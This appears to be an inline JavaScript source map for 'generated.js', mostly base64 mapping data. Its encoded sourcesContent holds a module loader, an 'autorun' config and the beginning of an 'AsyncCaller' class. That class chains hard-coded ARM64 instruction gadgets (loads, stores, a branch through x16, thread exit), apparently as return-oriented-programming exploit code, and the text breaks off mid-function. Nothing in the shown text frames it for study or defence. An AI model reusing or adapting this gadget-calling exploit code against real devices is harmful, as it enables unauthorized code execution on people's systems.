0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBOztBQzlPQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7OztBQ3JZQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBOzs7O0FDMWVBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7O0FDeExBO0FBQ0E7O0FDREE7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7O0FDakxBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTs7QUN2QkE7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBOzs7QUNMQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBO0FBQ0E7QUFDQTtBQUNBIiwiZmlsZSI6ImdlbmVyYXRlZC5qcyIsInNvdXJjZVJvb3QiOiIiLCJzb3VyY2VzQ29udGVudCI6WyIoZnVuY3Rpb24gZSh0LG4scil7ZnVuY3Rpb24gcyhvLHUpe2lmKCFuW29dKXtpZighdFtvXSl7dmFyIGE9dHlwZW9mIHJlcXVpcmU9PVwiZnVuY3Rpb25cIiYmcmVxdWlyZTtpZighdSYmYSlyZXR1cm4gYShvLCEwKTtpZihpKXJldHVybiBpKG8sITApO3ZhciBmPW5ldyBFcnJvcihcIkNhbm5vdCBmaW5kIG1vZHVsZSAnXCIrbytcIidcIik7dGhyb3cgZi5jb2RlPVwiTU9EVUxFX05PVF9GT1VORFwiLGZ9dmFyIGw9bltvXT17ZXhwb3J0czp7fX07dFtvXVswXS5jYWxsKGwuZXhwb3J0cyxmdW5jdGlvbihlKXt2YXIgbj10W29dWzFdW2VdO3JldHVybiBzKG4/bjplKX0sbCxsLmV4cG9ydHMsZSx0LG4scil9cmV0dXJuIG5bb10uZXhwb3J0c312YXIgaT10eXBlb2YgcmVxdWlyZT09XCJmdW5jdGlvblwiJiZyZXF1aXJlO2Zvcih2YXIgbz0wO288ci5sZW5ndGg7bysrKXMocltvXSk7cmV0dXJuIHN9KSIsIm1vZHVsZS5leHBvcnRzPXtcInNkYmNvcmVcIjp0cnVlLFwiYXV0b3J1blwiOnRydWV9IiwiLyogZXNsaW50IGNhbWVsY2FzZTogXCJvZmZcIiAqL1xuLyogZXNsaW50IG5vLXJlZGVjbGFyZTogXCJvZmZcIiAqL1xuLyogZ2xvYmFsIHBlcmZvcm1hbmNlICovXG52YXIgdXRpbHMgPSByZXF1aXJlKCcuL3V0aWxzJyk7XG5cbmNsYXNzIEFzeW5jQ2FsbGVyIHtcblx0Y29uc3RydWN0b3IgKHNjKSB7XG5cdFx0dGhpcy5zYyA9IHNjO1xuXG5cdFx0dGhpcy5sb2FkX2dhZGdldCA9IHNjLmdhZGdldCgnMDIwYzQxYTkwNDE0NDJhOTA2MWM0M2E5MDgyNDQ0YTknKTtcblx0XHQvLyB0aGlzLmxkcl94OCA9IHNjLmdhZGdldCgnMDgwNTQwZjkwMDAxM2ZkNjYwN2U0MDkyZmQ3YjQyYTlmNDRmNDFhOScpXG5cblx0XHR0aGlzLnN0cl94MF94MTkgPSBzYy5nYWRnZXQoJ2ZkN2I0MWE5NjAwMjAwZjlmMzA3NDJmOGMwMDM1ZmQ2Jyk7XG5cdFx0dGhpcy5sZHJfeDAgPSBzYy5nYWRnZXQoJ2UwMDc0MGY5ZmQ3YjQxYTlmZjgzMDA5MWMwMDM1ZmQ2Jyk7XG5cdFx0dGhpcy5icl94MTYgPSBzYy5nYWRnZXQoJ2ZkN2JjMWE4MDAwMjFmZDYnKTtcblx0XHR0aGlzLmxkcl94MTkgPSBzYy5nYWRnZXQoJ2YzMTc0MGY5ZmQ3YjQzYTlmZjAzMDE5MWMwMDM1ZmQ2Jyk7XG5cdFx0dGhpcy5leGl0X3RocmVhZCA9IHNjLmdhZGdldCgnNDEwMTAwZDQnKTtcblx0fVxuXG5cdC8vIHRpbWVvdXQgaW4gbWlsbGlzZWNvbmRzXG5cdC8vICAtMTogbm8gdGltZW91dFxuXHRjYWxsIChmdW5jX3B0